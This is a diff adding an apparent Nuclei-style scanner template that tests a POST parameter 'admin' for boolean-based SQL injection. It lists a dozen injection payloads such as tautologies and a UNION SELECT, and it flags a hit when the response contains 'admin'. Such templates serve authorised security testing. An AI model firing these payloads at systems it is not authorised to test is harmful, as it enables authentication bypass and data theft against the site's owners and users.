@@ -1,0 +1,38 @@
+id: sqli-boolean-based-post
+
+info:
+  name: Boolean Based SQL Injection (POST) - Admin in Body
+  author: serhatcck
+  severity: critical
+  description: Boolean Based SQLi via POST parameter 'admin' and body contains 'admin'
+  tags: sqli, dast
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      injection:
+        - "' or '123'='123"
+        - " or 123 = 123"
+        - "' and '123'='123"
+        - "\" or \"123\"=\"123\""
+        - "\" and \"123\"=\"123\""
+        - " or 1=1 -- -"
+        - " or 1=1; -- -"
+        - "and 1=1; -- -"
+        - "' or '1'='1' #"
+        - "' OR '1'='1"
+        - " OR 1=1 -- -"
+        - "' UNION SELECT 1,2,3 -- -"
+
+    body: "admin={{injection}}"
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "admin"
+        part: body
